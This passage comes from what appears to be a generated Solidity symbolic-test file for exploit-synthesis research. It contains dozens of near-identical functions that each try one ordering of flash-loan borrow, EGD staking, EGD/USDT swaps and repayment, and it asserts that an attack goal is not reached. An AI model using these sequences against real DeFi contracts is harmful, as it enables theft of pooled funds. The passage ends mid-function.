    function check_cand423(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand424(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand425(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand426(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand427(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand428(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand429(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand430(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand431(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand432(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand433(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand434(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand435(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand436(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand437(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand438(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand439(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand440(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand441(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand442(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand443(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand444(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand445(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand446(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand447(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand448(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand449(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand450(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand451(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand452(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand453(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand454(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand455(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand456(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand457(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand458(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand459(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand460(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand461(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand462(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand463(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand464(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand465(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand466(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand467(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand468(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand469(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand470(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand471(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand472(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand473(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand474(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand475(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand476(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand477(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand478(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
